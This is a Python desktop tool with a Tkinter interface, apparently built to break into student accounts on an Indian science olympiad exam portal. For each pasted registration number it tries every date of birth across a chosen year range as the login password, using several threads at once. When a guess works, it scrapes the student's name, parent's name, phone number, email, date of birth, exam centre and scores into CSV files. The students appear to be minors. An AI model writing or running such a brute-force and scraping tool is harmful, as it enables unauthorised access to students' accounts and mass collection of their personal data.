import csv
import json
import os
import queue
import re
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from tkinter import (
    Tk,
    Text,
    StringVar,
    BooleanVar,
    END,
    Frame,
    Label,
    Entry,
    Button,
    Checkbutton,
    OptionMenu,
)
from tkinter.scrolledtext import ScrolledText

import requests
from bs4 import BeautifulSoup

URL_LOGIN = "https://iapt.manageexam.com/Student/Login"
URL_SCORECARD = "https://iapt.manageexam.com/Student/Application/ScoreCard"
URL_JS_SCORECARD = "https://iapt.manageexam.com/Student/Application/JSscorecard"

DETAIL_KEYS = {
    "regno",
    "Name",
    "Mobile",
    "Email",
    "name",
    "parent_name",
    "gender",
    "class_standard",
    "roll_no",
    "date_of_birth",
    "exam_center",
}

EXAM_OPTIONS = ["NSEJS", "NSEA", "NSEB", "NSEC", "NSEP"]
SCORE_KEYS = ["NSEA", "NSEB", "NSEC", "NSEP", "NSEJS"]

LOG_FIELDS = [
    "regno",
    "dob",
    "login_ok",
    "login_status",
    "scorecard_status",
    "email",
    "details",
    "scores",
    "scores_count",
    "scorecard_html_path",
    "name_mismatch",
    "retry_count",
    "all_scores_na",
]

LOG_HTML_DIR = "scorecard_html"


def extract_student_details(html_content):
    soup = BeautifulSoup(html_content, "html.parser")

    def get_label_value(label_text):
        label_element = soup.find("h4", string=lambda text: text and label_text in text)
        if label_element:
            sibling = label_element.find_next("label")
            return sibling.text.strip() if sibling else None
        return None

    details = {
        "name": get_label_value("Name"),
        "parent_name": get_label_value("Father/Mother"),
        "gender": get_label_value("Gender"),
        "class_standard": get_label_value("Class/Standard"),
        "roll_no": get_label_value("Roll No."),
        "date_of_birth": get_label_value("Date of Birth"),
        "exam_center": get_label_value("Appeared at centre"),
    }

    score_block = BeautifulSoup(html_content, "html.parser").find(
        "div", class_="col-sm-12", style="padding-bottom: 20px;"
    )
    scores = {}
    if score_block:
        subjects_column = score_block.find("div", class_="col-sm-4") or score_block.find(
            "div", class_="col-sm-5"
        )
        score_columns = score_block.find_all("div", class_="col-sm-2")
        scores_column = (
            score_columns[1]
            if len(score_columns) > 1
            else (score_columns[0] if score_columns else None)
        )
        if subjects_column and scores_column:
            subjects = []
            for label in subjects_column.find_all("label"):
                raw = label.text.strip()
                code_match = re.match(r"^[A-Z]{3,5}", raw)
                subjects.append(code_match.group(0) if code_match else raw.split("(")[0].strip())
            if not subjects:
                for heading in subjects_column.find_all(["h4", "h5"]):
                    raw = heading.text.strip()
                    code_match = re.match(r"^[A-Z]{3,5}", raw)
                    subjects.append(code_match.group(0) if code_match else raw.split("(")[0].strip())
            score_values = [
                label.text.strip()
                for label in scores_column.find_all("label", style="font-weight: bold;")
            ]
            scores = {subject: score for subject, score in zip(subjects, score_values)}

    return {**details, **scores}


def get_email(html_content):
    name_pattern = r"Name\s*:</label>\s*<label.*?text-primary.*?>(.*?)</label>"
    mobile_pattern = (
        r"Mobile No\s*:</label>\s*(?:<label.*?>.*?</label>\s*)*?<label.*?"
        r"text-primary.*?>(\d{10})</label>"
    )
    email_pattern = r"Email Id\s*:</label>\s*<label.*?text-primary.*?>(.*?)</label>"

    name_match = re.search(name_pattern, html_content)
    mobile_match = re.search(mobile_pattern, html_content)
    email_match = re.search(email_pattern, html_content)

    return {
        "Name": name_match.group(1).strip() if name_match else "Not Found",
        "Mobile": mobile_match.group(1).strip() if mobile_match else "Not Found",
        "Email": email_match.group(1).strip() if email_match else "Not Found",
    }


def normalize_name(value):
    if not value:
        return ""
    return re.sub(r"[^A-Z0-9]", "", value.upper())


def extract_scores_only(data):
    return {k: v for k, v in data.items() if k not in DETAIL_KEYS}


def merge_scores(primary, secondary):
    combined = dict(primary)
    for key, value in secondary.items():
        if key not in combined or str(combined[key]).strip().upper() == "NA":
            combined[key] = value
    return combined


def login(regno, dob):
    session = requests.Session()
    response = session.get(URL_LOGIN)
    soup = BeautifulSoup(response.content, "html.parser")
    token = soup.find("input", {"name": "__RequestVerificationToken"})["value"]
    data = {
        "__RequestVerificationToken": token,
        "RegNo": regno,
        "DOB": dob,
    }
    response = session.post(URL_LOGIN, data=data)
    post_status = response.status_code
    if response.url == URL_LOGIN:
        return False, {
            "login_ok": False,
            "login_status": post_status,
            "scorecard_status": None,
            "email": {},
            "details": {},
            "scores": {},
        }

    email = get_email(response.text)
    response = session.get(URL_SCORECARD)
    scorecard_html = response.text
    student_details = extract_student_details(scorecard_html)
    scorecard_scores = extract_scores_only(student_details)

    response = session.get(URL_JS_SCORECARD)
    if response.status_code == 200:
        js_html = response.text
        js_details = extract_student_details(js_html)
        js_scores = extract_scores_only(js_details)
        if js_details and js_scores:
            if any(k in scorecard_scores for k in ("NSEA", "NSEB", "NSEC", "NSEP")):
                merged_scores = merge_scores(scorecard_scores, js_scores)
                student_details.update(merged_scores)
            else:
                scorecard_html = js_html
                student_details = js_details

    name_mismatch = False
    if email.get("Name") != "Not Found" and student_details.get("name"):
        name_mismatch = normalize_name(email["Name"]) != normalize_name(student_details["name"])

    scores_only = extract_scores_only(student_details)
    details_only = {k: v for k, v in student_details.items() if k not in scores_only}
    regno_dict = {"regno": regno}
    return {**regno_dict, **email, **student_details}, {
        "login_ok": True,
        "login_status": post_status,
        "scorecard_status": response.status_code,
        "email": email,
        "details": details_only,
        "scores": scores_only,
        "scorecard_html": scorecard_html,
        "name_mismatch": name_mismatch,
    }


def ensure_header(path, fieldnames):
    if not os.path.exists(path) or os.path.getsize(path) == 0:
        return
    with open(path, newline="") as f:
        reader = csv.reader(f)
        existing_header = next(reader, [])
    if existing_header != fieldnames:
        with open(path, newline="") as f:
            rows = list(csv.DictReader(f, restkey="__extra__"))
        with open(path, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction="ignore")
            writer.writeheader()
            for row in rows:
                row.pop("__extra__", None)
                writer.writerow(row)


def build_score_string(scores, score_keys):
    if not scores:
        return ""
    parts = []
    for key in score_keys:
        if key in scores:
            value = str(scores[key]).strip()
            if value:
                parts.append(f"{key}={value}")
    return "; ".join(parts)


class ScrapeApp:
    def __init__(self, root):
        self.root = root
        self.root.title("IAPT Scraper")
        self.log_queue = queue.Queue()
        self.stop_event = threading.Event()

        self.output_path = StringVar(value="output_scores.csv")
        self.log_path = StringVar(value="scrape_log.csv")
        self.text_log_path = StringVar(value="scrape_actions.log")
        self.start_year = StringVar(value="2011")
        self.end_year = StringVar(value="2012")
        self.workers = StringVar(value="2")
        self.verbose_attempts = BooleanVar(value=False)
        self.exam_choice = StringVar(value=EXAM_OPTIONS[0])

        self._build_ui()
        self.root.after(100, self._poll_log)

    def _build_ui(self):
        top = Frame(self.root)
        top.pack(fill="x", padx=8, pady=6)

        Label(top, text="Reg Numbers (paste):").grid(row=0, column=0, sticky="w")
        self.reg_text = ScrolledText(top, width=80, height=8)
        self.reg_text.grid(row=1, column=0, columnspan=6, sticky="we", pady=4)

        Label(top, text="Output CSV:").grid(row=2, column=0, sticky="w")
        Entry(top, textvariable=self.output_path, width=60).grid(row=2, column=1, columnspan=5, sticky="we")

        Label(top, text="Log CSV:").grid(row=3, column=0, sticky="w")
        Entry(top, textvariable=self.log_path, width=60).grid(row=3, column=1, columnspan=5, sticky="we")

        Label(top, text="Action Log:").grid(row=4, column=0, sticky="w")
        Entry(top, textvariable=self.text_log_path, width=60).grid(row=4, column=1, columnspan=5, sticky="we")

        Label(top, text="Year Start:").grid(row=5, column=0, sticky="w")
        Entry(top, textvariable=self.start_year, width=8).grid(row=5, column=1, sticky="w")
        Label(top, text="Year End:").grid(row=5, column=2, sticky="w")
        Entry(top, textvariable=self.end_year, width=8).grid(row=5, column=3, sticky="w")
        Label(top, text="Workers:").grid(row=5, column=4, sticky="w")
        Entry(top, textvariable=self.workers, width=6).grid(row=5, column=5, sticky="w")

        Label(top, text="Exam:").grid(row=6, column=0, sticky="w")
        OptionMenu(top, self.exam_choice, *EXAM_OPTIONS).grid(row=6, column=1, sticky="w")
        Checkbutton(top, text="Verbose DOB attempts", variable=self.verbose_attempts).grid(
            row=6, column=2, columnspan=2, sticky="w"
        )

        btns = Frame(self.root)
        btns.pack(fill="x", padx=8, pady=4)
        self.start_btn = Button(btns, text="Start", command=self.start)
        self.start_btn.pack(side="left")
        self.stop_btn = Button(btns, text="Stop", command=self.stop)
        self.stop_btn.pack(side="left", padx=4)

        Label(self.root, text="Live Log:").pack(anchor="w", padx=8)
        self.log_view = ScrolledText(self.root, width=90, height=12)
        self.log_view.pack(fill="both", expand=True, padx=8, pady=4)

    def log(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        line = f"[{timestamp}] {message}"
        self.log_queue.put(line)
        path = self.text_log_path.get().strip()
        if path:
            with open(path, "a") as f:
                f.write(line + "\n")

    def _poll_log(self):
        while True:
            try:
                line = self.log_queue.get_nowait()
            except queue.Empty:
                break
            self.log_view.insert(END, line + "\n")
            self.log_view.see(END)
        self.root.after(100, self._poll_log)

    def stop(self):
        self.stop_event.set()
        self.log("Stop requested.")

    def start(self):
        self.stop_event.clear()
        self.start_btn.configure(state="disabled")
        thread = threading.Thread(target=self._run, daemon=True)
        thread.start()

    def _run(self):
        try:
            self._run_scrape()
        finally:
            self.start_btn.configure(state="normal")

    def _run_scrape(self):
        raw = self.reg_text.get("1.0", END)
        regnos = re.findall(r"[A-Z]{2}\d{9}", raw)
        if not regnos:
            self.log("No registration numbers found.")
            return

        try:
            start_year = int(self.start_year.get())
            end_year = int(self.end_year.get())
        except ValueError:
            self.log("Invalid year range.")
            return
        if start_year > end_year:
            start_year, end_year = end_year, start_year

        try:
            workers = max(1, int(self.workers.get()))
        except ValueError:
            workers = 1

        output_path = self.output_path.get().strip() or "output_scores.csv"
        log_path = self.log_path.get().strip() or "scrape_log.csv"
        exam = self.exam_choice.get().strip().upper()
        if exam not in EXAM_OPTIONS:
            self.log("Invalid exam selection.")
            return
        score_keys = [exam]

        output_fields = [
            "regno",
            "dob_used",
            "scrape_ok",
            "score",
            *score_keys,
            "Name",
            "Mobile",
            "Email",
            "name",
            "parent_name",
            "gender",
            "class_standard",
            "roll_no",
            "date_of_birth",
            "exam_center",
        ]

        os.makedirs(LOG_HTML_DIR, exist_ok=True)
        ensure_header(output_path, output_fields)
        ensure_header(log_path, LOG_FIELDS)

        output_lock = threading.Lock()
        log_lock = threading.Lock()

        def append_log_row(row):
            with log_lock:
                write_header = not os.path.exists(log_path) or os.path.getsize(log_path) == 0
                with open(log_path, "a", newline="") as f:
                    writer = csv.DictWriter(f, fieldnames=LOG_FIELDS, extrasaction="ignore")
                    if write_header:
                        writer.writeheader()
                    writer.writerow(row)

        def append_output_row(row):
            with output_lock:
                write_header = not os.path.exists(output_path) or os.path.getsize(output_path) == 0
                with open(output_path, "a", newline="") as f:
                    writer = csv.DictWriter(f, fieldnames=output_fields, extrasaction="ignore")
                    if write_header:
                        writer.writeheader()
                    writer.writerow(row)

        def scrape_regno(regno):
            attempts = 0
            last_log = None
            for year in range(start_year, end_year + 1):
                for month in range(1, 13):
                    for day in range(1, 32):
                        if self.stop_event.is_set():
                            return
                        try:
                            datetime(year, month, day)
                        except ValueError:
                            continue
                        attempts += 1
                        dob = f"{day:02d}/{month:02d}/{year}"
                        if self.verbose_attempts.get():
                            self.log(f"Trying {regno} DOB {dob}")
                        result, log_data = login(regno, dob)
                        last_log = log_data
                        if log_data["login_ok"]:
                            scores = log_data["scores"]
                            selected_scores = {exam: scores.get(exam)} if exam in scores else {}
                            all_scores_na = False
                            if selected_scores:
                                all_scores_na = all(
                                    str(v).strip().upper() == "NA" for v in selected_scores.values()
                                )
                            html_path = ""
                            if not selected_scores or log_data.get("name_mismatch") or all_scores_na:
                                html_path = os.path.join(LOG_HTML_DIR, f"{regno}.html")
                                with open(html_path, "w", encoding="utf-8") as f:
                                    f.write(log_data.get("scorecard_html", ""))

                            log_row = {
                                "regno": regno,
                                "dob": dob,
                                "login_ok": log_data["login_ok"],
                                "login_status": log_data["login_status"],
                                "scorecard_status": log_data["scorecard_status"],
                                "email": json.dumps(log_data["email"], ensure_ascii=True),
                                "details": json.dumps(log_data["details"], ensure_ascii=True),
                                "scores": json.dumps(scores, ensure_ascii=True),
                                "scores_count": len(scores),
                                "scorecard_html_path": html_path,
                                "name_mismatch": log_data.get("name_mismatch", False),
                                "retry_count": attempts,
                                "all_scores_na": all_scores_na,
                            }
                            append_log_row(log_row)

                            if log_data.get("name_mismatch"):
                                self.log(f"{regno}: name mismatch, skipping")
                                return

                            output_row = {field: "" for field in output_fields}
                            output_row["regno"] = regno
                            output_row["dob_used"] = dob
                            output_row["scrape_ok"] = True
                            output_row["score"] = build_score_string(selected_scores, score_keys)
                            if exam in scores:
                                output_row[exam] = scores[exam]
                            for key, value in result.items():
                                if key in output_row:
                                    output_row[key] = value
                            append_output_row(output_row)
                            self.log(f"{regno}: success with DOB {dob}")
                            return

            fallback = last_log or {
                "login_ok": False,
                "login_status": None,
                "scorecard_status": None,
                "email": {},
                "details": {},
                "scores": {},
            }
            log_row = {
                "regno": regno,
                "dob": "",
                "login_ok": fallback["login_ok"],
                "login_status": fallback["login_status"],
                "scorecard_status": fallback["scorecard_status"],
                "email": json.dumps(fallback["email"], ensure_ascii=True),
                "details": json.dumps(fallback["details"], ensure_ascii=True),
                "scores": json.dumps(fallback["scores"], ensure_ascii=True),
                "scores_count": len(fallback["scores"]),
                "scorecard_html_path": "",
                "name_mismatch": False,
                "retry_count": attempts,
                "all_scores_na": False,
            }
            append_log_row(log_row)
            output_row = {field: "" for field in output_fields}
            output_row["regno"] = regno
            output_row["dob_used"] = ""
            output_row["scrape_ok"] = False
            append_output_row(output_row)
            self.log(f"{regno}: no match found")

        self.log(f"Starting scrape for {len(regnos)} registration numbers.")
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(scrape_regno, regno) for regno in regnos]
            for future in futures:
                future.result()
        self.log("Done.")


if __name__ == "__main__":
    app_root = Tk()
    app = ScrapeApp(app_root)
    app_root.mainloop()
